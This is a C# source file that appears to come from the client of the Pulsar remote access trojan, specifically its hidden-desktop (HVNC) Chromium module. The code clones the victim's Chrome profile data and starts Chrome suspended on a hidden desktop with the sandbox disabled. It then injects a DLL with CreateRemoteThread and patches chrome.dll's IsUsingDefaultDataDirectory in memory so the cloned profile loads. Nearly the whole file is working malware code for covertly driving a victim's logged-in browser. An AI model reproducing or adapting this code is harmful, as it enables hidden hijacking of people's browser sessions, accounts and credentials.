using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Helper.HVNC.Chromium
{
    //Massive credits to resist (printer) for coming up with this solution for me. I can confidently say I did little to nothing to help besides wait 30 minutes to open chrome in IDA.
    //If you steal this solution/patch please give credits lol. (To any cybersec professional reading this, I'm in desperate need of a job or internship I will do anything. Please.)
    //Also shoutout to PureRat for giving us the idea after we dumped the source to the stub. We saw how bad their solution was so we made this :sob:
    public class PrinterPatcher
    {
        private string ChromiumExePath { get; set; }
        private string ChromiumDllPath { get; set; }
        private string ChromiumInstallFolderPath { get; set; }
        private string ChromiumBrowserName { get; set; }

        private string RealAppData { get; set; } = null;
        private string FakeAppData { get; set; } = null;

        /// <summary>
        /// Creates a new PrinterPatcher instance
        /// </summary>
        /// <param name="chromeexepath">Path to chrome.exe</param>
        /// <param name="chromeInstallDir">Path to Chrome installation directory (containing version folders)</param>
        public PrinterPatcher(string chromeexepath, string chromeInstallDir, string globalBorwserName)
        {
            if (string.IsNullOrEmpty(chromeexepath))
                throw new ArgumentNullException(nameof(chromeexepath));

            if (string.IsNullOrEmpty(chromeInstallDir))
                throw new ArgumentNullException(nameof(chromeInstallDir));

            ChromiumExePath = chromeexepath;

            // Find the latest Chrome version folder with chrome.dll
            string latestVersionFolder = FindLatestChromeVersion(chromeInstallDir);

            if (string.IsNullOrEmpty(latestVersionFolder))
                throw new FileNotFoundException($"Could not find Chrome version folder in: {chromeInstallDir}");

            // basically the ChromiumBorwserName is just the name of the dir after PROGRAMFILES
            ChromiumBrowserName = globalBorwserName;

            ChromiumInstallFolderPath = latestVersionFolder;
            ChromiumDllPath = Path.Combine(ChromiumInstallFolderPath, "chrome.dll");

            ValidatePaths();
        }

        /// <summary>
        /// Validates that the specified paths exist
        /// </summary>
        private void ValidatePaths()
        {
            if (!File.Exists(ChromiumExePath))
                throw new FileNotFoundException($"Chrome executable not found at: {ChromiumExePath}");

            if (!File.Exists(ChromiumDllPath))
                throw new FileNotFoundException($"Chrome DLL not found at: {ChromiumDllPath}");
        }

        /// <summary>
        /// Finds the latest Chrome version folder that contains chrome.dll
        /// </summary>
        private string FindLatestChromeVersion(string chromeInstallDir)
        {
            try
            {
                if (!Directory.Exists(chromeInstallDir))
                    throw new DirectoryNotFoundException($"Chrome installation directory not found: {chromeInstallDir}");

                // find latest version dir
                List<string> versionFolders = new List<string>();

                foreach (string dir in Directory.EnumerateDirectories(chromeInstallDir))
                {
                    string folderName = Path.GetFileName(dir);
                    if (folderName.Length > 0 && char.IsDigit(folderName[0]))
                    {
                        string dllPath = Path.Combine(dir, "chrome.dll");
                        if (File.Exists(dllPath))
                        {
                            versionFolders.Add(dir);
                        }
                    }
                }

                if (versionFolders.Count == 0)
                    return string.Empty;

                // get newest folder by creation time
                return versionFolders.OrderByDescending(dir => Directory.GetCreationTime(dir)).First();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"> Error finding Chrome version: {ex.Message}");
                return string.Empty;
            }
        }

        /// <summary>
        /// Finds the offset of the target function in the chrome.dll
        /// </summary>
        private int FindMatchOffset(byte[] src)
        {
            var offsets = new List<int>();
            string pattern = "56 48 83 EC 70 ?? ?? ?? ?? ?? 48 89 CE 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 ?? ?? ?? ?? 48 8D 54 24";
            string[] patternSplit = pattern.Split(' ');
            byte[] newBytes = new byte[patternSplit.Length];
            List<int> wildcards = new List<int>();
            for (int i = 0; i < patternSplit.Length; i++)
            {
                string p = patternSplit[i];
                if (p == "??")
                {
                    wildcards.Add(i);
                    newBytes[i] = 0;
                }
                else
                {
                    newBytes[i] = Convert.ToByte(p, 16);
                }
            }

            for (int i = 0; i <= src.Length - newBytes.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < newBytes.Length; j++)
                {
                    if (!wildcards.Contains(j) && src[i + j] != newBytes[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match)
                    return i;
            }

            return 0;
        }

        /// <summary>
        /// Reads and returns the chrome.dll file as byte array
        /// </summary>
        private byte[] ReadChromeDll()
        {
            try
            {
                if (File.Exists(ChromiumDllPath))
                {
                    return File.ReadAllBytes(ChromiumDllPath);
                }

                Debug.WriteLine($"> ERROR: Chrome DLL not found at '{ChromiumDllPath}'");
                return new byte[0];
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"> ERROR reading Chrome DLL: {ex.Message}");
                return new byte[0];
            }
        }

        private void DirectoryCopy(string sourceDirName, string destDirName)
        {
            var dir = new DirectoryInfo(sourceDirName);
            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {sourceDirName}");

            if (!Directory.Exists(destDirName))
                Directory.CreateDirectory(destDirName);

            var files = dir.GetFiles();
            var dirs = dir.GetDirectories();

            Parallel.ForEach(files, file =>
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, false);
            });

            Parallel.ForEach(dirs, subdir =>
            {
                string temppath = Path.Combine(destDirName, subdir.Name);
                DirectoryCopy(subdir.FullName, temppath);
            });
        }

        private void EnableEnvironmentVariableFucker()
        {
            RealAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            FakeAppData = Environment.GetEnvironmentVariable("TEMP") + "\\FakeAppData";
            if (Directory.Exists(FakeAppData)) Directory.Delete(FakeAppData, true);
            Directory.CreateDirectory(FakeAppData);
            DirectoryCopy(RealAppData + ChromiumBrowserName, FakeAppData + ChromiumBrowserName);
            Debug.WriteLine("> Cloned '{0}' to '{1}'", RealAppData + ChromiumBrowserName, FakeAppData + ChromiumBrowserName);
            Environment.SetEnvironmentVariable("LOCALAPPDATA", FakeAppData);
            Debug.WriteLine("> Overrided %LOCALAPPDATA% environment variable");
        }

        private void DisableEnvironmentVariableFucker()
        {
            Environment.SetEnvironmentVariable("LOCALAPPDATA", RealAppData);
            Debug.WriteLine("> Restored %LOCALAPPDATA% environment variable");
        }

        private bool ApplyPatch(int pid, int offset)
        {
            try
            {
                DllInjector.InjectDll(pid, ChromiumDllPath);
                Debug.WriteLine("> Loaded chrome.dll into chrome process");

                // Wait a moment for the DLL to be fully loaded
                System.Threading.Thread.Sleep(1000);

                IntPtr chromeDllBaseAddress = IntPtr.Zero;
                Process targetProcess = Process.GetProcessById(pid);

                // Refresh the process modules to ensure we see the newly injected DLL
                targetProcess.Refresh();

                Debug.WriteLine("> Searching for chrome.dll in process modules:");
                foreach (ProcessModule module in targetProcess.Modules)
                {
                    Debug.WriteLine("  Module: " + module.FileName);

                    // Check both the filename and module name
                    if (module.FileName.ToLower().Contains("chrome.dll") ||
                        module.ModuleName.ToLower().Contains("chrome.dll"))
                    {
                        chromeDllBaseAddress = module.BaseAddress;
                        Debug.WriteLine("> Found chrome.dll at address: {0:X}", (ulong)chromeDllBaseAddress);
                        break;
                    }
                }

                if (chromeDllBaseAddress == IntPtr.Zero)
                {
                    Debug.WriteLine("> ERROR: chrome.dll not found in process modules after injection");
                    Debug.WriteLine("> Available modules:");
                    foreach (ProcessModule module in targetProcess.Modules)
                    {
                        Debug.WriteLine("    {0} (Base: {1:X})", module.FileName, (ulong)module.BaseAddress);
                    }
                    return false;
                }

                Debug.WriteLine("> Got address of chrome.dll: {0:X}", (ulong)chromeDllBaseAddress);
                IntPtr targetFunction = IntPtr.Add(chromeDllBaseAddress, offset + 0x0A00);
                Debug.WriteLine("> Calculated address of IsUsingDefaultDataDirectory function: {0:X}", (ulong)targetFunction);

                byte[] PatchBytes = new byte[] { 0x56, 0x48, 0x89, 0xCE, 0xB0, 0x01, 0x88, 0x06, 0x88, 0x46, 0x01, 0x5E, 0xC3 };

                int bytesWritten = NativeMemory.WriteMemory(pid, targetFunction, PatchBytes);
                Debug.WriteLine("> Wrote {0} bytes to memory", bytesWritten);

                return bytesWritten == PatchBytes.Length;
            }
            catch (Exception ex)
            {
                Debug.WriteLine("> ERROR in ApplyPatch: " + ex.Message);
                return false;
            }
        }


        /// <summary>
        /// Starts Chrome with the patch applied
        /// </summary>
        public void Start()
        {
            // Get the version folder name (e.g., "123.0.6312.86")
            string versionFolderName = Path.GetFileName(ChromiumInstallFolderPath);
            int majorVersion = 0;
            if (!string.IsNullOrEmpty(versionFolderName))
            {
                var parts = versionFolderName.Split('.');
                if (parts.Length > 0)
                    int.TryParse(parts[0], out majorVersion);
            }

            Debug.WriteLine($"> Detected Chrome version: {versionFolderName} (major version: {majorVersion})");

            if (majorVersion > 0 && majorVersion <= 135)
            {
                // No patch needed, just start Chrome normally
                Debug.WriteLine($"> Chrome version {majorVersion} detected, skipping patch.");
                int goodVerPID = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
                Thread.Sleep(500);
                ProcessHelper.ResumeProcess(goodVerPID);
                return;
            }

            // Patch logic as before
            byte[] chromeDll = ReadChromeDll();
            Debug.WriteLine("> Read {0} bytes from chrome.dll", chromeDll.Length);
            if (chromeDll.Length == 0) return;

            int offset = FindMatchOffset(chromeDll);
            Debug.WriteLine("> Offset of chrome::IsUsingDefaultDataDirectory function: {0:X8}", offset);
            if (offset == 0) return;

            EnableEnvironmentVariableFucker();
            int chromePid = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
            Debug.WriteLine("> Created suspended chrome process: {0}", chromePid);
            DisableEnvironmentVariableFucker();

            if (ApplyPatch(chromePid, offset))
            {
                Debug.WriteLine("> Applied IsUsingDefaultDataDirectory patch to chrome process");
                ProcessHelper.ResumeProcess(chromePid);
                Debug.WriteLine("> Resumed chrome process");
            }
            else
            {
                Process.GetProcessById(chromePid).Kill();
            }
        }
    }

    public static class NativeMemory
    {
        private const uint PROCESS_VM_WRITE = 0x0020;
        private const uint PROCESS_VM_OPERATION = 0x0008;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            UIntPtr nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        public static int WriteMemory(int pid, IntPtr baseAddress, byte[] data)
        {
            if (data == null || data.Length == 0)
                throw new ArgumentException("Data buffer is null or empty.", nameof(data));

            IntPtr hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                throw new System.ComponentModel.Win32Exception(error, "Failed to open target process.");
            }

            try
            {
                bool result = WriteProcessMemory(hProcess, baseAddress, data, (UIntPtr)data.Length, out UIntPtr bytesWritten);

                if (!result || bytesWritten.ToUInt32() != data.Length)
                {
                    int errorCode = Marshal.GetLastWin32Error();
                    throw new System.ComponentModel.Win32Exception(errorCode, "Failed to write memory to process.");
                }

                return (int)bytesWritten;
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }
    }

    public static class DllInjector
    {
        private const uint PROCESS_CREATE_THREAD = 0x0002;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_VM_OPERATION = 0x0008;
        private const uint PROCESS_VM_WRITE = 0x0020;
        private const uint PROCESS_VM_READ = 0x0010;

        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_READWRITE = 0x04;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] buffer, uint size, out UIntPtr numberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        private const uint WAIT_OBJECT_0 = 0x00000000;
        private const uint INFINITE = 0xFFFFFFFF;

        public static void InjectDll(int pid, string dllPath)
        {
            if (!File.Exists(dllPath))
            {
                throw new FileNotFoundException($"DLL not found: {dllPath}");
            }

            IntPtr hProcess = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                false, pid);

            if (hProcess == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "Failed to open process");

            try
            {
                // Convert path to absolute path
                string absolutePath = Path.GetFullPath(dllPath);
                byte[] dllPathBytes = Encoding.Unicode.GetBytes(absolutePath + "\0");

                Debug.WriteLine("> Injecting DLL: " + absolutePath);

                IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (allocMemAddress == IntPtr.Zero)
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "Failed to allocate memory in target process");

                Debug.WriteLine("> Allocated memory at: {0:X}", (ulong)allocMemAddress);

                if (!WriteProcessMemory(hProcess, allocMemAddress, dllPathBytes, (uint)dllPathBytes.Length, out UIntPtr bytesWritten))
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "Failed to write DLL path to target process memory");

                Debug.WriteLine("> Wrote {0} bytes to target process", bytesWritten);

                IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
                if (kernel32Handle == IntPtr.Zero)
                    throw new Exception("Failed to get handle for kernel32.dll");

                IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");
                if (loadLibraryAddr == IntPtr.Zero)
                    throw new Exception("Failed to get address of LoadLibraryW");

                Debug.WriteLine("> LoadLibraryW address: {0:X}", (ulong)loadLibraryAddr);

                IntPtr threadId;
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, out threadId);

                if (hThread == IntPtr.Zero)
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "Failed to create remote thread");

                Debug.WriteLine("> Created remote thread with ID: {0}", threadId);

                // Wait for the thread to complete
                uint waitResult = WaitForSingleObject(hThread, 5000); // 5 second timeout
                if (waitResult != WAIT_OBJECT_0)
                {
                    Debug.WriteLine("> Warning: Remote thread did not complete within timeout");
                }
                else
                {
                    Debug.WriteLine("> Remote thread completed successfully");
                }

                CloseHandle(hThread);
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }
    }

    public class ProcessHelper
    {
        private const int THREAD_SUSPEND_RESUME = 0x0002;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        private const uint TH32CS_SNAPTHREAD = 0x00000004;

        [StructLayout(LayoutKind.Sequential)]
        private struct THREADENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ThreadID;
            public uint th32OwnerProcessID;
            public int tpBasePri;
            public int tpDeltaPri;
            public uint dwFlags;
        }

        public static void ResumeProcess(int pid)
        {
            IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (snapshot == IntPtr.Zero)
                throw new Exception("Failed to create snapshot.");

            THREADENTRY32 threadEntry = new THREADENTRY32();
            threadEntry.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));

            bool foundThread = false;

            if (Thread32First(snapshot, ref threadEntry))
            {
                do
                {
                    if (threadEntry.th32OwnerProcessID == (uint)pid)
                    {
                        IntPtr threadHandle = OpenThread(THREAD_SUSPEND_RESUME, false, threadEntry.th32ThreadID);
                        if (threadHandle == IntPtr.Zero)
                            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

                        uint suspendCount = ResumeThread(threadHandle);
                        if (suspendCount == unchecked((uint)-1))
                        {
                            CloseHandle(threadHandle);
                            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                        }

                        CloseHandle(threadHandle);

                        foundThread = true;
                        break;
                    }
                } while (Thread32Next(snapshot, ref threadEntry));
            }

            CloseHandle(snapshot);

            if (!foundThread)
                throw new Exception($"No thread found for process with PID {pid}");
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        private const uint CREATE_SUSPENDED = 0x00000004;

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        public static int CreateSuspendedProcess(string path, string arguments = null)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "PulsarDesktop";
            PROCESS_INFORMATION pi = default;

            // default args to use
            if (string.IsNullOrEmpty(arguments))
            {
                //pretty sure I have to do this because the path being executed is the first one but its being ignored? not too sure.
                // there is probably a really good explanation for this but I'm lowkey too lazy to go look it up so this will do.
                arguments = "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized";
            }

            bool success = CreateProcess(
                path,
                arguments,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                ref pi
            );

            if (!success)
            {
                int error = Marshal.GetLastWin32Error();
                throw new System.ComponentModel.Win32Exception(error);
            }

            if (pi.hThread != IntPtr.Zero)
                CloseHandle(pi.hThread);
            if (pi.hProcess != IntPtr.Zero)
                CloseHandle(pi.hProcess);

            return pi.dwProcessId;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
    }
}